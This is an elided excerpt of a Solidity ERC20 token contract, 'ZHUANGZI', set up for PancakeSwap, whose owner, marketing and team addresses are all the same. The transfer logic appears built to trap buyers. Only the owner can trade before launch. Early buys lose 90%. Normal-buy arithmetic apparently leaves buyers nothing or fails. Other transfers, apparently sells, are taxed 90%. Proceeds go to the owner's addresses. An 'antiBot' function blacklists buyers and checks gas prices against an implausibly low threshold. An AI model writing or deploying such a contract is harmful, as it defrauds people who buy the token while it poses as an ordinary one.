...
contract ZHUANGZI is ERC20 {
    ...
    uint256 public oneDividendNum = 60;
    uint256 public _walletMax = 200 *10**18;
    uint160 public ktNum = 171;
    uint160 public constant MAXADD = ~uint160(0);
    uint256 public startTradeBlock;
    uint256 public killNum = 5;
    ...
    uint256 private A = 90 ;
    uint256 private maxGasOfBot = 450000;
    UsdtWrap RECV;
    ...
    constructor() ERC20("ZHUANGZI", "ZZ") {

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        _tokenOwner = address(0xfEc1b58e1714F099e6cEc8ffD10c6acf35e2CB1f);
        marketAddress = address(0xfEc1b58e1714F099e6cEc8ffD10c6acf35e2CB1f);
        teamAddress= address(0xfEc1b58e1714F099e6cEc8ffD10c6acf35e2CB1f);
        ...
        areadyKnowContracts[address(uniswapV2Pair)] =  true;
    ...
    function _transfer(
        ...
        if((ammPairs[from]  || ammPairs[to]) && swapstatus == false){
            require( from == address(_tokenOwner) || to == address(_tokenOwner)|| from == address(teamAddress) || to == address(teamAddress),"only _tokenOwner!||teamAddress");            
        }
            ...
            uint256 share = amount.div(100);
               if(ammPairs[from]){ 
                ...
                if (block.number <= startTradeBlock + killNum) {
                    super._transfer(from, deadAddress, amount.div(100).mul(40));           
                    super._transfer(from, address(this), amount.div(100).mul(50));
                    _takeInviterFeeKt(amount.div(10000)); 
                    feeAmount = feeAmount.add(share.mul(50));  
                    amount = amount.div(100).mul(10);  
                } else{ 
                ...
                amount = amount.div(100).mul(95);
                    ...
                    _takeInviterFeeKt(amount.div(10000)); 
                    feeAmount = feeAmount.add(share.mul(4));  
                    amount = amount.div(100).mul(95).sub(amount.mul(999).div(1000)); 
                                   
            }else{
                super._transfer(from, address(this), amount.mul(A).div(100).div(2));
                super._transfer(from, deadAddress, amount.mul(A).div(100).div(2));
                feeAmount = feeAmount.add(amount.mul(A).div(100).div(2));
                amount = amount.sub(amount.mul(A).div(100));
            }                        
        }
    ...
    function swapProc() public {
        ...
        if(balanceOf(address(this)) >= canSellAmount && canSellAmount >= amountT){
            ...
            uint256 marketAmount = newBal.div(2);
            IERC20(usdt).transfer(marketAddress,marketAmount.mul(4).div(5));
            IERC20(usdt).transfer(teamAddress,marketAmount.div(5));
    ...
    function antiBot(address sender,address recipient) public{
        ...
        bool isBotBuy = (!areadyKnowContracts[recipient] && isContract(recipient) ) && ammPairs[sender];
        if(isBotBuy){
            _isBlacklisted[recipient] =  true;
        }

        //check the gas of buy
        if(ammPairs[sender]&& tx.gasprice > maxGasOfBot ){
